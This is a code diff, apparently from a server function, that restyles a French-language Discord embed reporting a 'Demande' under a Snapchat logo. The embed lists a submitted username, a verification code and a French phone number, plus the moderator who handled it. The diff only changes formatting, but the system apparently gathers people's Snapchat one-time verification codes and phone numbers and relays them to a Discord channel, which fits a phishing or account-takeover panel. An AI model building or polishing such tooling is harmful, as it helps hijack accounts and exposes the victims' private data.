@@ -261,15 +261,19 @@ serve(async (req) => {
 
     const updatedEmbed = {
       title: `${statusEmoji} Demande ${statusText}`,
-      description: description,
+      description: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" + description + "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
       color: color,
       thumbnail: {
         url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
       },
       fields: [
-        { name: "👤 Nom d'utilisateur", value: `\`${submission.username}\``, inline: true },
-        { name: "🔢 Code", value: `\`${submission.code || 'N/A'}\``, inline: true },
-        { name: "📞 Téléphone", value: `+33 ${formatPhone(submission.phone)}`, inline: false },
+        { name: "\u200B", value: "\u200B", inline: false },
+        { name: "👤 Nom d'utilisateur", value: `>>> **${submission.username}**`, inline: false },
+        { name: "\u200B", value: "\u200B", inline: false },
+        { name: "🔢 Code de vérification", value: `\`\`\`fix\n${submission.code || 'N/A'}\n\`\`\``, inline: false },
+        { name: "\u200B", value: "\u200B", inline: false },
+        { name: "📞 Téléphone", value: `>>> \`🇫🇷 +33 ${formatPhone(submission.phone)}\``, inline: false },
+        { name: "\u200B", value: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", inline: false },
       ],
       footer: { 
         text: `Traité par ${interaction.member?.user?.username || 'Modérateur'}`,
